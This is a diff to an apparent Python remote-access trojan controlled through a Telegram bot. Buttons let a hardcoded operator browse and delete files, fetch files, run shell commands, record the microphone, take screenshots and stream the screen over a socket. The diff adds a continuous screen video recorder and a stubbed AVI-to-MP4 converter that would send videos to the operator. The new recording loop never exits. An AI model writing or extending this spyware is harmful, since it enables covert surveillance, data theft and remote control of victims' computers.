@@ -4,9 +4,9 @@ import pyaudio
 import socket
 import pickle
 import struct
-import random
 import time
 import wave
+import cv2
 import os
 
 import numpy as np
@@ -14,16 +14,24 @@ import numpy as np
 from telebot import TeleBot
 from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from PIL import Image
+import moviepy.editor as moviepy
 
 # Variables
-API_TOKEN = "<token>"
+
+
+API_TOKEN = <token>
 ADMIN = <id>
 
 filename_audio = "recorded_audio.wav"
 filename_video = "recorded_video.avi"
+filename_video2 = "recorded_video2.avi"
 filename_screenshot = "screenshot.jpg"
 
-chunk = 1024
+SREEN_SIZE = (1920, 1080)
+fourcc = cv2.VideoWriter_fourcc(*"XVID")
+start = True
+
+chunk = 2048
 FORMAT = pyaudio.paInt16
 channels = 1
 sample_rate = 44100
@@ -35,7 +43,8 @@ markup.add(KeyboardButton("cd"), KeyboardButton("cd_path"),
            KeyboardButton("dir"), KeyboardButton("del"),
            KeyboardButton("type"), KeyboardButton("get_file"),
            KeyboardButton("exec_cmd"), KeyboardButton("record_audio"),
-           KeyboardButton("dump_audio"), KeyboardButton("screenshot"),
+           KeyboardButton("dump_audio"), KeyboardButton("record_video"),
+           KeyboardButton("avi_to_mp4"), KeyboardButton("screenshot"),
            KeyboardButton("screen_broadcast"))
 
 
@@ -213,7 +222,7 @@ def exec_cmd(ms):
     bot.register_next_step_handler(ms, exec_cmd_next)
 
 def record_audio(ms):
-        bot.send_message(ADMIN, "Enter time, quantity iteration...")
+        bot.send_message(ADMIN, "Enter time, quantity iteration...", reply_markup=markup)
         
         @bot.message_handler(content_types=["text"])
         def record_audio_next(ms):
@@ -255,12 +264,49 @@ def dump_audio():
         wf.writeframes(b"".join(frame))
         wf.close()
         
-        bot.send_message(ADMIN, "Unpacked ✅")
+        bot.send_message(ADMIN, "Unpacked ✅", reply_markup=markup)
         
         with open(filename_audio, "rb") as audio:
             bot.send_audio(ADMIN, audio)
         
         os.remove(filename_audio)
+
+def record_video(ms):
+    bot.send_message(ADMIN, "Recording 🎲", reply_markup=markup)
+    out = cv2.VideoWriter(filename=filename_video, fourcc=fourcc, fps=15.0, frameSize=(SREEN_SIZE))
+    
+    while True:
+        image = pyautogui.screenshot()
+        image = np.array(image)
+        
+        frame = image
+        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+        out.write(frame)
+
+    bot.send_message(ADMIN, "Finished ✅")
+    cv2.destroyAllWindows()
+    out.release()
+
+def avi_to_mp4(ms):
+    """
+    Получение всех элементов в список, дальнейшая конвертация
+    всем элементов с списке по именам и отправка в тг
+    """
+    
+    # bot.send_message(ADMIN, "convert to mp4...")
+
+    # ...
+
+    # clip = moviepy.VideoFileClip(filename_video)
+    # clip.write_videofile("recorded.mp4", logger=None)
+    
+    # os.remove(filename_video)
+    
+    # with open("recorded.mp4", "rb") as video:
+    #     bot.send_message(ADMIN, "Success ✅")
+    #     bot.send_video(ADMIN, video)
+
+    # os.remove("recorded.mp4")
 
 def screenshot():
     myScreenshot = pyautogui.screenshot()
@@ -300,7 +346,6 @@ def screen_broadcast(ms):
                 img = Image.frombytes('RGB', (1024, 576), image)
                 data = pickle.dumps(np.array(img))
                 clientsocket.sendall(struct.pack("L", len(data)) + data)
-                
         except Exception as e:
             bot.send_message(ADMIN, f"Error:\n{e}")
     
@@ -343,6 +388,12 @@ def CheckCommand(ms):
 
         elif ms.text == "dump_audio":
             dump_audio()
+
+        elif ms.text == "record_video":
+            record_video(ms)
+        
+        elif ms.text == "avi_to_mp4":
+            avi_to_mp4(ms)
 
         elif ms.text == "screenshot":
             screenshot()
